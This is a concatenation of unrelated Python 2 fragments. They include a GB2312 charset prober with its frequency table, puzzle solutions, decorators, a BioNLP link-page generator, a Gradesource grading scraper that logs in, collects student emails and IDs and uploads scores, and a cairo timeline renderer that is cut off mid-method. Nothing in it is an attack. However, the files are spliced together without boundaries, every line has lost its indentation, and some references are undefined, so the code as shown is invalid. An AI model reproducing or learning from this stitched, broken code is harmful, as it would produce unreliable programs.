3643,6399,3528,6651,4453,3315,4637,6652,3984,6197,5535,3182,3339,6653,3096,2660,
6400,6654,3449,5934,4250,4236,6047,6401,5831,6655,5487,3753,4062,5832,6198,6199,
6656,3766,6657,3403,4667,6048,6658,4338,2897,5833,3880,2797,3780,4326,6659,5748,
5015,6660,5387,4351,5601,4411,6661,3654,4424,5935,4339,4072,5277,4568,5536,6402,
6662,5238,6663,5349,5203,6200,5204,6201,5145,4536,5016,5056,4762,5834,4399,4957,
6202,6403,5666,5749,6664,4340,6665,5936,5177,5667,6666,6667,3459,4668,6404,6668,
6669,4543,6203,6670,4276,6405,4480,5537,6671,4614,5205,5668,6672,3348,2193,4763,
6406,6204,5937,5602,4177,5669,3419,6673,4020,6205,4443,4569,5388,3715,3639,6407,
6049,4058,6206,6674,5938,4544,6050,4185,4294,4841,4651,4615,5488,6207,6408,6051,
5178,3241,3509,5835,6208,4958,5836,4341,5489,5278,6209,2823,5538,5350,5206,5429,
6675,4638,4875,4073,3516,4684,4914,4860,5939,5603,5389,6052,5057,3237,5490,3791,
6676,6409,6677,4821,4915,4106,5351,5058,4243,5539,4244,5604,4842,4916,5239,3028,
3716,5837,5114,5605,5390,5940,5430,6210,4332,6678,5540,4732,3667,3840,6053,4305,
3408,5670,5541,6410,2744,5240,5750,6679,3234,5606,6680,5607,5671,3608,4283,4159,
4400,5352,4783,6681,6411,6682,4491,4802,6211,6412,5941,6413,6414,5542,5751,6683,
4669,3734,5942,6684,6415,5943,5059,3328,4670,4144,4268,6685,6686,6687,6688,4372,
3603,6689,5944,5491,4373,3440,6416,5543,4784,4822,5608,3792,4616,5838,5672,3514,
5391,6417,4892,6690,4639,6691,6054,5673,5839,6055,6692,6056,5392,6212,4038,5544,
5674,4497,6057,6693,5840,4284,5675,4021,4545,5609,6418,4454,6419,6213,4113,4472,
5314,3738,5087,5279,4074,5610,4959,4063,3179,4750,6058,6420,6214,3476,4498,4716,
5431,4960,4685,6215,5241,6694,6421,6216,6695,5841,5945,6422,3748,5946,5179,3905,
5752,5545,5947,4374,6217,4455,6423,4412,6218,4803,5353,6696,3832,5280,6219,4327,
4702,6220,6221,6059,4652,5432,6424,3749,4751,6425,5753,4986,5393,4917,5948,5030,
5754,4861,4733,6426,4703,6697,6222,4671,5949,4546,4961,5180,6223,5031,3316,5281,
6698,4862,4295,4934,5207,3644,6427,5842,5950,6428,6429,4570,5843,5282,6430,6224,
5088,3239,6060,6699,5844,5755,6061,6431,2701,5546,6432,5115,5676,4039,3993,3327,
4752,4425,5315,6433,3941,6434,5677,4617,4604,3074,4581,6225,5433,6435,6226,6062,
4823,5756,5116,6227,3717,5678,4717,5845,6436,5679,5846,6063,5847,6064,3977,3354,
6437,3863,5117,6228,5547,5394,4499,4524,6229,4605,6230,4306,4500,6700,5951,6065,
3693,5952,5089,4366,4918,6701,6231,5548,6232,6702,6438,4704,5434,6703,6704,5953,
4168,6705,5680,3420,6706,5242,4407,6066,3812,5757,5090,5954,4672,4525,3481,5681,
4618,5395,5354,5316,5955,6439,4962,6707,4526,6440,3465,4673,6067,6441,5682,6708,
5435,5492,5758,5683,4619,4571,4674,4804,4893,4686,5493,4753,6233,6068,4269,6442,
6234,5032,4705,5146,5243,5208,5848,6235,6443,4963,5033,4640,4226,6236,5849,3387,
6444,6445,4436,4437,5850,4843,5494,4785,4894,6709,4361,6710,5091,5956,3331,6237,
4987,5549,6069,6711,4342,3517,4473,5317,6070,6712,6071,4706,6446,5017,5355,6713,
6714,4988,5436,6447,4734,5759,6715,4735,4547,4456,4754,6448,5851,6449,6450,3547,
5852,5318,6451,6452,5092,4205,6716,6238,4620,4219,5611,6239,6072,4481,5760,5957,
5958,4059,6240,6453,4227,4537,6241,5761,4030,4186,5244,5209,3761,4457,4876,3337,
5495,5181,6242,5959,5319,5612,5684,5853,3493,5854,6073,4169,5613,5147,4895,6074,
5210,6717,5182,6718,3830,6243,2798,3841,6075,6244,5855,5614,3604,4606,5496,5685,
5118,5356,6719,6454,5960,5357,5961,6720,4145,3935,4621,5119,5962,4261,6721,6455,
4786,5963,4375,4582,6245,6246,6247,6076,5437,4877,5856,3376,4380,6248,4160,6722,
5148,6456,5211,6457,6723,4718,6458,6724,6249,5358,4044,3297,6459,6250,5857,5615,
5497,5245,6460,5498,6725,6251,6252,5550,3793,5499,2959,5396,6461,6462,4572,5093,
5500,5964,3806,4146,6463,4426,5762,5858,6077,6253,4755,3967,4220,5965,6254,4989,
5501,6464,4352,6726,6078,4764,2290,5246,3906,5438,5283,3767,4964,2861,5763,5094,
6255,6256,4622,5616,5859,5860,4707,6727,4285,4708,4824,5617,6257,5551,4787,5212,
4965,4935,4687,6465,6728,6466,5686,6079,3494,4413,2995,5247,5966,5618,6729,5967,
5764,5765,5687,5502,6730,6731,6080,5397,6467,4990,6258,6732,4538,5060,5619,6733,
4719,5688,5439,5018,5149,5284,5503,6734,6081,4607,6259,5120,3645,5861,4583,6260,
4584,4675,5620,4098,5440,6261,4863,2379,3306,4585,5552,5689,4586,5285,6735,4864,
6736,5286,6082,6737,4623,3010,4788,4381,4558,5621,4587,4896,3698,3161,5248,4353,
4045,6262,3754,5183,4588,6738,6263,6739,6740,5622,3936,6741,6468,6742,6264,5095,
6469,4991,5968,6743,4992,6744,6083,4897,6745,4256,5766,4307,3108,3968,4444,5287,
3889,4343,6084,4510,6085,4559,6086,4898,5969,6746,5623,5061,4919,5249,5250,5504,
5441,6265,5320,4878,3242,5862,5251,3428,6087,6747,4237,5624,5442,6266,5553,4539,
6748,2585,3533,5398,4262,6088,5150,4736,4438,6089,6267,5505,4966,6749,6268,6750,
6269,5288,5554,3650,6090,6091,4624,6092,5690,6751,5863,4270,5691,4277,5555,5864,
6752,5692,4720,4865,6470,5151,4688,4825,6753,3094,6754,6471,3235,4653,6755,5213,
5399,6756,3201,4589,5865,4967,6472,5866,6473,5019,3016,6757,5321,4756,3957,4573,
6093,4993,5767,4721,6474,6758,5625,6759,4458,6475,6270,6760,5556,4994,5214,5252,
6271,3875,5768,6094,5034,5506,4376,5769,6761,2120,6476,5253,5770,6762,5771,5970,
3990,5971,5557,5558,5772,6477,6095,2787,4641,5972,5121,6096,6097,6272,6763,3703,
5867,5507,6273,4206,6274,4789,6098,6764,3619,3646,3833,3804,2394,3788,4936,3978,
4866,4899,6099,6100,5559,6478,6765,3599,5868,6101,5869,5870,6275,6766,4527,6767)
from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import GB2312DistributionAnalysis
from .mbcssm import GB2312SMModel
class GB2312Prober(MultiByteCharSetProber):
def __init__(self):
MultiByteCharSetProber.__init__(self)
self._mCodingSM = CodingStateMachine(GB2312SMModel)
self._mDistributionAnalyzer = GB2312DistributionAnalysis()
self.reset()
def get_charset_name(self):
return "GB2312"
class Solution(object):
def solve(self, cipher):
return len(reduce(lambda x, y: x & y, [set(list(elt)) for elt in cipher]))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
number = int(f.readline().strip())
cipher = []
for t in xrange(number):
cipher.append(f.readline().strip())
s = "%s\n" % (Solution().solve(cipher))
print s,
from util.commons_util.logger_utils.timer import Timer
def timestamp(func):
def ret(*args):
timer = Timer()
timer.start()
result = func(*args)
print timer.end()
return result
return ret
def print_func_name(func):
def ret(*args):
print func.func_name
result = func(*args)
return result
return ret
import sys
import os
try:
import argparse
except ImportError:
from os.path import basename
from sys import path as sys_path
sys_path.append(join_path(basename(__file__), '../server/lib'))
import argparse
known_filename_extensions = [".txt", ".a1", ".a2"]
def argparser():
ap=argparse.ArgumentParser(description="Generate web page linking to visualizations of BioNLP ST documents.")
ap.add_argument("-v", "--visualizer", default="visualizer.xhtml", metavar="URL", help="Visualization script")
ap.add_argument("-s", "--staticdir", default="static", metavar="DIR", help="Directory containing static visualizations")
ap.add_argument("-d", "--dataset", default=None, metavar="NAME", help="Dataset name (derived from directory by default.)")
ap.add_argument("directory", help="Directory containing ST documents.")
ap.add_argument("prefix", metavar="URL", help="URL prefix to prepend to links")
return ap
def files_to_process(dir):
try:
toprocess = []
for fn in os.listdir(dir):
fp = os.path.join(dir, fn)
if os.path.isdir(fp):
print >> sys.stderr, "Skipping directory %s" % fn
elif os.path.splitext(fn)[1] not in known_filename_extensions:
print >> sys.stderr, "Skipping %s: unrecognized suffix" % fn
else:
toprocess.append(fp)
except OSError, e:
print >> sys.stderr, "Error processing %s: %s" % (dir, e)
return toprocess
def print_links(files, arg, out=sys.stdout):
grouped = {}
for fn in files:
root, ext = os.path.splitext(fn)
if root not in grouped:
grouped[root] = []
grouped[root].append(ext)
sorted = grouped.keys()
sorted.sort()
print >> out, "<table>"
for root in sorted:
path, fn = os.path.split(root)
print >> out, "<tr>"
print >> out, "  <td>%s</td>" % fn
print >> out, "  <td><a href=\"%s\">dynamic</a></td>" % (arg.prefix+arg.visualizer+"#"+arg.dataset+"/"+fn)
print >> out, "  <td><a href=\"%s\">svg</a></td>" % (arg.prefix+arg.staticdir+"/svg/"+arg.dataset+"/"+fn+".svg")
print >> out, "  <td><a href=\"%s\">png</a></td>" % (arg.prefix+arg.staticdir+"/png/"+arg.dataset+"/"+fn+".png")
for ext in known_filename_extensions:
if ext in grouped[root]:
print >> out, "  <td><a href=\"%s\">%s</a></td>" % (arg.prefix+root+ext, ext[1:])
else:
print >> out, "  <td>-</td>"
print >> out, "</tr>"
print >> out, "</table>"
def main(argv=None):
if argv is None:
argv = sys.argv
arg = argparser().parse_args(argv[1:])
if arg.dataset is None:
dir = arg.directory
while dir[-1] == os.sep:
dir = dir[:-1]
arg.dataset = os.path.split(dir)[1]
print >> sys.stderr, "Assuming dataset name '%s', visualizations in %s" % (arg.dataset, os.path.join(arg.staticdir,arg.dataset))
try:
files = files_to_process(arg.directory)
if files is None or len(files) == 0:
print >> sys.stderr, "No files found"
return 1
print_header()
print_links(files, arg)
print_footer()
except:
print >> sys.stderr, "Error processing %s" % arg.directory
raise
return 0
def print_header(out=sys.stdout):
print >> out,
def print_footer(out=sys.stdout):
print >> out,
if __name__ == "__main__":
sys.exit(main())
def drange(start, stop, step):
r = start
while r<stop:
yield r
r += step
def frange(start, stop, step):
return list(drange(start, stop, step))
from bs4 import BeautifulSoup
import re, requests
import csv
class GradesourceSession:
cookies = None
s = requests.session()
savedAccount = {}
savedPIDAccount = {}
savedName = {}
savedNamePID = {}
def __init__(self, username, password, courseid):
s = self.s
print("Logging in....")
postData = {'User' : username, 'Password' : password}
loginPOST = s.post('https://www.gradesource.com/validate.asp', data = postData)
if loginPOST.status_code != 200:
print("Login failed... Exiting")
exit()
self.cookies = loginPOST.cookies
print("Selecting course %s" % courseid)
selectcourseGET = s.get('https://www.gradesource.com/selectcourse.asp?id=%s' % courseid, cookies = self.cookies)
self.cookies = selectcourseGET.cookies
self.s = s
self.email()
def updateEmailScore(self, field, CSV, overwrite):
s = self.s
print("Converting CSV into a list...")
reader = csv.reader(open(CSV, 'rU'), delimiter=',')
try:
scoreDict = dict(reader)
except Exception, e:
print("oops, your file is malformed, please fix it (check for extra lines)")
print(overwrite)
if (float(overwrite) == 0):
for k,v in scoreDict.items():
if (v == "0"):
scoreDict[k] = ""
print(scoreDict)
print("CSV Converted")
self.s = s
self.updateScores(field, scoreDict)
def updatePIDScore(self, field, CSV, overwrite):
s = self.s
print("Converting CSV into a list...")
reader = csv.reader(open(CSV, 'rU'), delimiter=',')
try:
scoreDict = dict(reader)
except Exception, e:
print("oops, your file is malformed, please fix it (check for extra lines)")
print(scoreDict)
if (float(overwrite) == 0):
for k,v in scoreDict.items():
if (v == "0"):
scoreDict[k] = ""
updateScore = {}
savedPIDAccount = self.savedPIDAccount
for key in savedPIDAccount.keys():
try:
updateScore[key] = scoreDict[savedPIDAccount[key]]
except Exception, e:
print(savedPIDAccount[key]+ "was unable to be joined and therefore skipped")
continue
print(updateScore)
print("CSV Converted to email")
self.s = s
self.updateScores(field, updateScore)
def updateScores(self, field, scoreDict):
s = self.s
print("Updating scores...")
html = s.get('https://www.gradesource.com/editscores1.asp?id=%s' % field, cookies = self.cookies).content
returnOutput = {}
totalCount = re.compile('<td nowrap colspan=3 class=BT>&nbsp;&nbsp;Maximum Points: &nbsp;&nbsp;<font color="#336699"><b>(.*)</b></font></td>')
maximumScore = totalCount.search(html).group(1).strip()
for k,v in scoreDict.items():
if (v == ""):
value = -1
else:
value = float(v)
maxScore = float(maximumScore)
if(value > maxScore):
print(k + " has a score of " + v + " which is larger than the maximum score of " + maximumScore)
returnOutput[k] = v
nomnomsoup = BeautifulSoup(html)
updatePOSTDict = {}
updateIDDict = {}
for x in nomnomsoup.form('input', id = re.compile("^student")):
studentNumber = re.compile('input id="(.*)" name=')
studentString = studentNumber.search(str(x))
studStr = studentString.group(1).strip()
gradesourceNumber = re.compile('type="hidden" value="(.*)"')
x =  x.findNext("input")
gradesourceString = gradesourceNumber.search(str(x))
gradStr = gradesourceString.group(1).strip()
updatePOSTDict[studStr] = gradStr
idNumber = re.compile('input name="id(.*)" type="hidden"')
idString = idNumber.search(str(x))
idString = "id"+str(idString.group(1).strip())
updateIDDict[idString] = gradStr
joinedDictA = {}
saveAccount = self.savedAccount
for key in saveAccount.keys():
try:
joinedDictA[key] = scoreDict[saveAccount[key]]
except Exception, e:
print(saveAccount[key] + " was found in Gradesource but not in the CSV.")
continue
joinedDictB = {}
for key in updatePOSTDict.keys():
try:
joinedDictB[key] = joinedDictA[updatePOSTDict[key]]
except Exception, e:
print(updatePOSTDict[key] + " was unable to be joined and therefore skipped")
continue
joinedDictB.update(updateIDDict)
joinedDictB['assessmentId'] = field
joinedDictB['verifyAccepted'] = 'N'
joinedDictB['studentCount'] = str(len(saveAccount))
ret = s.post('https://www.gradesource.com/updatescores1.asp', data = joinedDictB, cookies = self.cookies)
print "Scores Updated"
for k,v in returnOutput.items():
print("WARNING: " + k + " HAS A SCORE OF " + v + " WHICH IS LARGER THAN MAX. SCORE INPUTTED. PLEASE CHECK SITE TO CONFIRM")
def email(self):
s = self.s
print("Generating list of students")
html = s.get("https://www.gradesource.com/student.asp", cookies = self.cookies).content
nomnomsoup = BeautifulSoup(html)
tbody = nomnomsoup('td', text=re.compile("Secret*"))[0].parent.parent.parent.parent
emailDict = {}
emailPIDDict = {}
nameDict = {}
namePIDDict = {}
for tr in tbody('tr'):
try:
studentNum = tr.contents[9].find('a')['href']
studentNum = studentNum.replace("editstudent.asp?id=", "")
studentNum = studentNum.encode('ascii')
studentEmail = tr.contents[7].text.strip()
studentEmail = studentEmail.encode('ascii')
studentPID = tr.contents[3].text.strip()
studentPID = studentPID.encode('ascii')
studentName = tr.contents[1].text.strip()
studentName = studentName.encode('ascii')
if (str(studentEmail) != "Edit") :
emailDict[str(studentNum)] = str(studentEmail)
emailPIDDict[str(studentEmail)] = str(studentPID)
nameDict[str(studentName)] = str(studentEmail)
namePIDDict[str(studentName)] = str(studentPID)
except Exception, e:
continue
self.savedAccount = emailDict
print emailDict
print "Students List Generated"
self.savedName = nameDict
self.savedNamePID = namePIDDict
self.savedPIDAccount = emailPIDDict
self.s = s
def downloadEmail(self):
print("Creating CSV")
writer = csv.writer(open('Roster.csv', 'wb'))
for key, value in self.savedName.items():
writer.writerow([key,value])
print(self.savedName)
print("CSV Created")
def downloadiClicker(self):
print("Creating CSV")
writer = csv.writer(open('iClickerRoster.csv', 'wb'), escapechar=' ', quoting=csv.QUOTE_NONE)
for key, value in self.savedNamePID.items():
writer.writerow([key,value])
print("CSV Created")
from gradesourcesession import GradesourceSession
from getpass import getpass
def downloadEmail(login, courseID):
gradesource = GradesourceSession(login, getpass('Password: '), courseID)
gradesource.downloadEmail()
def downloadiClicker(login, courseID):
gradesource = GradesourceSession(login, getpass('Password: '), courseID)
gradesource.downloadiClicker()
def updateScoresByEmail(login, courseID, assignmentID, CSVFile, overwrite):
gradesource = GradesourceSession(login, getpass('Password: '), courseID)
gradesource.updateEmailScore(assignmentID, CSVFile, overwrite)
def updateScoresByPID(login,courseID, assignmentID, CSVFile, overwrite):
gradesource = GradesourceSession(login, getpass('Password: '), courseID)
gradesource.updatePIDScore(assignmentID, CSVFile, overwrite)
def downloadEmailGUI(login, courseID, password):
gradesource = GradesourceSession(login, password, courseID)
gradesource.downloadEmail()
def downloadiClickerGUI(login, courseID, password):
gradesource = GradesourceSession(login, password, courseID)
gradesource.downloadiClicker()
def updateScoresByEmailGUI(login, courseID, assignmentID, CSVFile, password, overwrite):
gradesource = GradesourceSession(login, password, courseID)
gradesource.updateEmailScore(assignmentID, CSVFile, overwrite)
def updateScoresByPIDGUI(login,courseID, assignmentID, CSVFile, password, overwrite):
gradesource = GradesourceSession(login, password, courseID)
gradesource.updatePIDScore(assignmentID, CSVFile, overwrite)
class Solution(object):
def solve(self, cipher):
m = len(cipher)
n = len(cipher[0])
cipher = map(lambda x: sorted(x), cipher)
for j in xrange(n):
for i in xrange(m - 1):
if cipher[i][j] > cipher[i + 1][j]:
return "NO"
return "YES"
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
n = int(f.readline().strip())
cipher = []
for i in xrange(n):
cipher.append(list(f.readline().strip()))
s = "%s\n" % (solution.solve(cipher))
print s,
import cairo
import sys
import re
import gtk
class DataRange:
def __init__(self, start = 0, end = 0, value = ''):
self.start = start
self.end = end
self.value = value
class EventString:
def __init__(self, at = 0, value = ''):
self.at = at
self.value = value
class EventFloat:
def __init__(self, at = 0, value = 0.0):
self.at = at
self.value = value
class EventInt:
def __init__(self, at = 0, value = 0.0):
self.at = at
self.value = value
def ranges_cmp(a, b):
diff = a.start - b.start
if diff < 0:
return -1
elif diff > 0:
return +1
else:
return 0
def events_cmp(a, b):
diff = a.at - b.at
if diff < 0:
return -1
elif diff > 0:
return +1
else:
return 0
class TimelineDataRange:
def __init__(self, name = ''):
self.name = name
self.ranges = []
return
def __search(self, key):
l = 0
u = len(self.ranges)-1
while l <= u:
i = int((l + u) / 2)
if key >= self.ranges[i].start and key <= self.ranges[i].end:
return i
elif key < self.ranges[i].start:
u = i - 1
else:
l = i + 1
return - 1
def add_range(self, range):
self.ranges.append(range)
def get_all(self):
return self.ranges
def get_ranges(self, start, end):
s = self.__search(start)
e = self.__search(end)
if s == -1 and e == -1:
return []
elif s == -1:
return self.ranges[0:e + 1]
elif e == -1:
return self.ranges[s:len(self.ranges)]
else:
return self.ranges[s:e + 1]
def get_ranges_bounds(self, start, end):
s = self.__search(start)
e = self.__search(end)
if s == -1 and e == -1:
return(0, 0)
elif s == -1:
return(0, e + 1)
elif e == -1:
return(s, len(self.ranges))
else:
return(s, e + 1)
def sort(self):
self.ranges.sort(ranges_cmp)
def get_bounds(self):
if len(self.ranges) > 0:
lo = self.ranges[0].start
hi = self.ranges[len(self.ranges)-1].end
return(lo, hi)
else:
return(0, 0)
class TimelineEvent:
def __init__(self, name = ''):
self.name = name
self.events = []
def __search(self, key):
l = 0
u = len(self.events)-1
while l <= u:
i = int((l + u) / 2)
if key == self.events[i].at:
return i
elif key < self.events[i].at:
u = i - 1
else:
l = i + 1
return l
def add_event(self, event):
self.events.append(event)
def get_events(self, start, end):
s = self.__search(start)
e = self.__search(end)
return self.events[s:e + 1]
def get_events_bounds(self, start, end):
s = self.__search(start)
e = self.__search(end)
return(s, e + 1)
def sort(self):
self.events.sort(events_cmp)
def get_bounds(self):
if len(self.events) > 0:
lo = self.events[0].at
hi = self.events[-1].at
return(lo, hi)
else:
return(0, 0)
class Timeline:
def __init__(self, name = ''):
self.ranges = []
self.event_str = []
self.event_int = []
self.name = name
def get_range(self, name):
for range in self.ranges:
if range.name == name:
return range
timeline = TimelineDataRange(name)
self.ranges.append(timeline)
return timeline
def get_event_str(self, name):
for event_str in self.event_str:
if event_str.name == name:
return event_str
timeline = TimelineEvent(name)
self.event_str.append(timeline)
return timeline
def get_event_int(self, name):
for event_int in self.event_int:
if event_int.name == name:
return event_int
timeline = TimelineEvent(name)
self.event_int.append(timeline)
return timeline
def get_ranges(self):
return self.ranges
def get_events_str(self):
return self.event_str
def get_events_int(self):
return self.event_int
def sort(self):
for range in self.ranges:
range.sort()
for event in self.event_int:
event.sort()
for event in self.event_str:
event.sort()
def get_bounds(self):
lo = 0
hi = 0
for range in self.ranges:
(range_lo, range_hi) = range.get_bounds()
if range_lo < lo:
lo = range_lo
if range_hi > hi:
hi = range_hi
for event_str in self.event_str:
(ev_lo, ev_hi) = event_str.get_bounds()
if ev_lo < lo:
lo = ev_lo
if ev_hi > hi:
hi = ev_hi
for event_int in self.event_int:
(ev_lo, ev_hi) = event_int.get_bounds()
if ev_lo < lo:
lo = ev_lo
if ev_hi > hi:
hi = ev_hi
return(lo, hi)
class Timelines:
def __init__(self):
self.timelines = []
def get(self, name):
for timeline in self.timelines:
if timeline.name == name:
return timeline
timeline = Timeline(name)
self.timelines.append(timeline)
return timeline
def get_all(self):
return self.timelines
def sort(self):
for timeline in self.timelines:
timeline.sort()
def get_bounds(self):
lo = 0
hi = 0
for timeline in self.timelines:
(t_lo, t_hi) = timeline.get_bounds()
if t_lo < lo:
lo = t_lo
if t_hi > hi:
hi = t_hi
return(lo, hi)
def get_all_range_values(self):
range_values = {}
for timeline in self.timelines:
for ranges in timeline.get_ranges():
for ran in ranges.get_all():
range_values[ran.value] = 1
return range_values.keys()
class Color:
def __init__(self, r = 0.0, g = 0.0, b = 0.0):
self.r = r
self.g = g
self.b = b
def set(self, r, g, b):
self.r = r
self.g = g
self.b = b
class Colors:
default_colors = [Color(1, 0, 0), Color(0, 1, 0), Color(0, 0, 1), Color(1, 1, 0), Color(1, 0, 1), Color(0, 1, 1)]
def __init__(self):
self.__colors = {}
def add(self, name, color):
self.__colors[name] = color
def lookup(self, name):
if not self.__colors.has_key(name):
self.add(name, self.default_colors.pop())
return self.__colors.get(name)
class TopLegendRenderer:
def __init__(self):
self.__padding = 10
def set_padding(self, padding):
self.__padding = padding
def set_legends(self, legends, colors):
self.__legends = legends
self.__colors = colors
def layout(self, width):
self.__width = width
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 1, 1)
ctx = cairo.Context(surface)
line_height = 0
total_height = self.__padding
line_used = self.__padding
for legend in self.__legends:
(t_width, t_height) = ctx.text_extents(legend)[2:4]
item_width = self.__padding + self.__padding + t_width + self.__padding
item_height = t_height + self.__padding
if item_height > line_height:
line_height = item_height
if line_used + item_width > self.__width:
line_used = self.__padding + item_width
total_height += line_height
else:
line_used += item_width
x = line_used - item_width
total_height += line_height
self.__height = total_height
def get_height(self):
return self.__height
def draw(self, ctx):
i = 0
line_height = 0
total_height = self.__padding
line_used = self.__padding
for legend in self.__legends:
(t_width, t_height) = ctx.text_extents(legend)[2:4]
item_width = self.__padding + self.__padding + t_width + self.__padding
item_height = t_height + self.__padding
if item_height > line_height:
line_height = item_height
if line_used + item_width > self.__width:
line_used = self.__padding + item_width
total_height += line_height
else:
line_used += item_width
x = line_used - item_width
ctx.rectangle(x, total_height, self.__padding, self.__padding)
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(2)
ctx.stroke_preserve()
ctx.set_source_rgb(self.__colors[i].r,
self.__colors[i].g,
self.__colors[i].b)
ctx.fill()
ctx.move_to(x + self.__padding*2, total_height + t_height)
ctx.set_source_rgb(0, 0, 0)
ctx.show_text(legend)
i += 1
return
class TimelinesRenderer:
def __init__(self):
self.padding = 10
return
def get_height(self):
return self.height
def set_timelines(self, timelines, colors):
self.timelines = timelines
self.colors = colors
def set_render_range(self, start, end):
self.start = start
self.end = end
def get_data_x_start(self):
return self.padding / 2 + self.left_width + self.padding + self.right_width + self.padding / 2
def layout(self, width):
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 1, 1)
ctx = cairo.Context(surface)
max_text_height = ctx.text_extents("ABCDEFGHIJKLMNOPQRSTUVWXYZabcedefghijklmnopqrstuvwxyz0123456789")[3]
left_width = 0
right_width = 0
left_n_lines = 0
range_n = 0
eventint_n = 0
eventstr_n = 0
for timeline in self.timelines.get_all():
left_n_lines += 1
t_width = ctx.text_extents(timeline.name)[2]
left_width = max(left_width, t_width)
for rang in timeline.get_ranges():
t_width = ctx.text_extents(rang.name)[2]
right_width = max(right_width, t_width)
range_n += 1
for events_int in timeline.get_events_int():
t_width = ctx.text_extents(events_int.name)[2]
right_width = max(right_width, t_width)
eventint_n += 1
for events_str in timeline.get_events_str():
t_width = ctx.text_extents(events_str.name)[2]
right_width = max(right_width, t_width)
eventstr_n += 1
left_height = left_n_lines * max_text_height + (left_n_lines - 1) * self.padding
right_n_lines = range_n + eventint_n + eventstr_n
right_height = (right_n_lines - 1) * self.padding + right_n_lines * max_text_height
right_data_height = (eventint_n + eventstr_n) * (max_text_height + 5) + range_n * 10
right_data_height += (right_n_lines - 1) * self.padding
height = max(left_height, right_height)
height = max(height, right_data_height)
self.left_width = left_width
self.right_width = right_width
self.max_text_height = max_text_height
self.width = width
self.height = height + self.padding
def draw_line(self, ctx, x, y, width, height):
ctx.move_to(x, y)
ctx.rel_line_to(width, height)
ctx.close_path()
ctx.set_operator(cairo.OPERATOR_SOURCE)
ctx.set_line_width(1.0)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke()
def draw_events(self, ctx, events, x, y, width, height):
if (self.grey_background % 2) == 0:
ctx.rectangle(x, y - self.padding / 2,
width, height + self.padding)
ctx.set_source_rgb(0.9, 0.9, 0.9)
ctx.fill()
last_x_drawn = int(x)
(lo, hi) = events.get_events_bounds(self.start, self.end)
for event in events.events[lo:hi]:
real_x = int(x + (event.at - self.start) * width / (self.end - self.start))
if real_x > last_x_drawn + 2:
ctx.rectangle(real_x, y, 1, 1)
ctx.set_source_rgb(1, 0, 0)
ctx.stroke()
ctx.move_to(real_x, y + self.max_text_height)
ctx.set_source_rgb(0, 0, 0)
ctx.show_text(str(event.value))
last_x_drawn = real_x
self.grey_background += 1
def draw_ranges(self, ctx, ranges, x, y, width, height):
if (self.grey_background % 2) == 0:
ctx.rectangle(x, y - self.padding / 2,
width, height + self.padding)
ctx.set_source_rgb(0.9, 0.9, 0.9)
ctx.fill()
last_x_drawn = int(x - 1)
(lo, hi) = ranges.get_ranges_bounds(self.start, self.end)
for data_range in ranges.ranges[lo:hi]:
s = max(data_range.start, self.start)
e = min(data_range.end, self.end)
x_start = int(x + (s - self.start) * width / (self.end - self.start))
x_end = int(x + (e - self.start) * width / (self.end - self.start))
if x_end > last_x_drawn:
ctx.rectangle(x_start, y, x_end - x_start, 10)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke_preserve()
color = self.colors.lookup(data_range.value)
ctx.set_source_rgb(color.r, color.g, color.b)
ctx.fill()
last_x_drawn = x_end
self.grey_background += 1
def draw(self, ctx):
timeline_top = 0
top_y = self.padding / 2
left_x_start = self.padding / 2
left_x_end = left_x_start + self.left_width
right_x_start = left_x_end + self.padding
right_x_end = right_x_start + self.right_width
data_x_start = right_x_end + self.padding / 2
data_x_end = self.width
data_width = data_x_end - data_x_start
cur_y = top_y
self.draw_line(ctx, 0, 0, self.width, 0)
self.grey_background = 1
for timeline in self.timelines.get_all():
(y_bearing, t_width, t_height) = ctx.text_extents(timeline.name)[1:4]
ctx.move_to(left_x_start, cur_y + self.max_text_height - (t_height + y_bearing))
ctx.show_text(timeline.name);
for events_int in timeline.get_events_int():
(y_bearing, t_width, t_height) = ctx.text_extents(events_int.name)[1:4]
ctx.move_to(right_x_start, cur_y + self.max_text_height - (t_height + y_bearing))
ctx.show_text(events_int.name)
self.draw_events(ctx, events_int, data_x_start, cur_y, data_width, self.max_text_height + 5)
cur_y += self.max_text_height + 5 + self.padding
self.draw_line(ctx, right_x_start - self.padding / 2, cur_y - self.padding / 2,
self.right_width + self.padding, 0)
for events_str in timeline.get_events_str():
(y_bearing, t_width, t_height) = ctx.text_extents(events_str.name)[1:4]
ctx.move_to(right_x_start, cur_y + self.max_text_height - (t_height + y_bearing))
ctx.show_text(events_str.name)
self.draw_events(ctx, events_str, data_x_start, cur_y, data_width, self.max_text_height + 5)
cur_y += self.max_text_height + 5 + self.padding
self.draw_line(ctx, right_x_start - self.padding / 2, cur_y - self.padding / 2,
self.right_width + self.padding, 0)
for ranges in timeline.get_ranges():
(y_bearing, t_width, t_height) = ctx.text_extents(ranges.name)[1:4]
ctx.move_to(right_x_start, cur_y + self.max_text_height - (t_height + y_bearing))
ctx.show_text(ranges.name)
self.draw_ranges(ctx, ranges, data_x_start, cur_y, data_width, 10)
cur_y += self.max_text_height + self.padding
self.draw_line(ctx, right_x_start - self.padding / 2, cur_y - self.padding / 2,
self.right_width + self.padding, 0)
self.draw_line(ctx, 0, cur_y - self.padding / 2,
self.width, 0)
bot_y = cur_y - self.padding / 2
self.draw_line(ctx, left_x_end + self.padding / 2, 0,
0, bot_y)
self.draw_line(ctx, right_x_end + self.padding / 2, 0,
0, bot_y)
return
class ScaleRenderer:
def __init__(self):
self.__top = 0
return
def set_bounds(self, lo, hi):
self.__lo = lo
self.__hi = hi
def get_position(self, x):
real_x = (x - self.__lo ) * self.__width / (self.__hi - self.__lo)
return real_x
def set_top(self):
self.__top = 1
def set_bot(self):
self.__top = 0
def layout(self, width):
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 1, 1)
ctx = cairo.Context(surface)
data_delta = self.__hi - self.__lo
closest = 1
while (closest*10) < data_delta:
closest *= 10
if (data_delta / closest) == 0:
delta = closest
elif(data_delta / closest) == 1:
delta = closest / 10
else:
delta = closest
start = self.__lo - (self.__lo % delta) + delta
end = self.__hi - (self.__hi % delta)
self.__delta = delta
self.__width = width
